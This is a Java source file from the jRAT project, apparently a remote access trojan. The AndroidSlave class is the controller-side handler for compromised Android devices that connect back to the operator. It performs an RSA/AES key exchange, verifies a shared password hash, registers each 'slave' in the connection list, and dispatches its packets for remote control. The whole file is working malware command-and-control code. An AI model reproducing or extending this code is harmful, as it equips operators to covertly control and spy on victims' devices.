package se.jrat.client.android;

import java.awt.TrayIcon;
import java.io.DataOutputStream;
import java.net.Socket;
import java.util.Arrays;

import javax.crypto.BadPaddingException;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.addons.PluginEventHandler;
import se.jrat.client.crypto.GlobalKeyPair;
import se.jrat.client.exceptions.CloseException;
import se.jrat.client.net.ConnectionHandler;
import se.jrat.client.net.ServerListener;
import se.jrat.client.packets.android.incoming.IncomingAndroidPackets;
import se.jrat.client.packets.android.outgoing.AbstractOutgoingAndroidPacket;
import se.jrat.client.packets.android.outgoing.AndroidPacket0Ping;
import se.jrat.client.utils.TrayIconUtils;
import se.jrat.common.codec.Hex;
import se.jrat.common.crypto.Crypto;
import se.jrat.common.crypto.KeyExchanger;
import se.jrat.common.hash.Sha1;

public class AndroidSlave extends AbstractSlave {
	
	public AndroidSlave(ServerListener connection, Socket socket) {
		super(connection, socket);
		new Thread(this).start();
	}

	@Override
	public void run() {
		try {
			initialize();
		
			KeyExchanger exchanger = new KeyExchanger(dis, dos, GlobalKeyPair.getKeyPair());
			exchanger.writePublicKey();
			exchanger.readRemotePublicKey();
			rsaKey = exchanger.getRemoteKey();
			
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(128);
            SecretKey secretKey = keyGen.generateKey();

            key = secretKey.getEncoded();
            byte[] encryptedKey = Crypto.encrypt(key, rsaKey, "RSA");
            dos.writeInt(encryptedKey.length);
            dos.write(encryptedKey);
			
			if (Main.debug) {
				Main.debug("Encryption key: " + Hex.encode(key));
			}

			while (true) {
				byte header = readByte();

				if (header == 1) {
					Sha1 sha = new Sha1();
					
					String data = connection.getPass();

					byte[] localHash = sha.hash(data);
					byte[] remoteHash = new byte[20];

					dis.readFully(remoteHash);					

					if (Arrays.equals(localHash, remoteHash)) {
						setVerified(true);
						ConnectionHandler.addSlave(this);
						continue;
					}
				}

				if (!isVerified()) {
					Main.instance.getPanelLog().addEntry("Warning", this, "Failed verifying password, not valid handshake");
					this.closeSocket(new CloseException("Failed verifying password, not valid handshake"));
				}

				if (header == 0) {
					pong();
					continue;
				}

				IncomingAndroidPackets.execute(header, this);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			String message = ex.getClass().getSimpleName() + ": " + ex.getMessage();

			Main.instance.getPanelLog().addEntry("Disconnect", this, message);

			if (ex instanceof BadPaddingException) {
				message += ", is the encryption key matching?";
			}

			try {
				ConnectionHandler.removeSlave(this, ex);
			} catch (Exception e) {
			}

			TrayIconUtils.showMessage(Main.instance.getTitle(), "Server " + getIP() + " disconnected: " + message, TrayIcon.MessageType.ERROR);
			PluginEventHandler.onDisconnect(this);
		}
	}

	@Override
	public void ping() throws Exception {
		addToSendQueue(new AndroidPacket0Ping());
	}

	@Override
	public String getDisplayName() {
		// TODO Auto-generated method stub
		return null;
	}
	
	public synchronized void addToSendQueue(AbstractOutgoingAndroidPacket packet) {
		while (lock) {
			try {
				Thread.sleep(10L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}

		}
		try {
			sendPacket(packet, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void sendPacket(AbstractOutgoingAndroidPacket packet, DataOutputStream dos) throws Exception {
		packet.send(this, dos);
	}

}
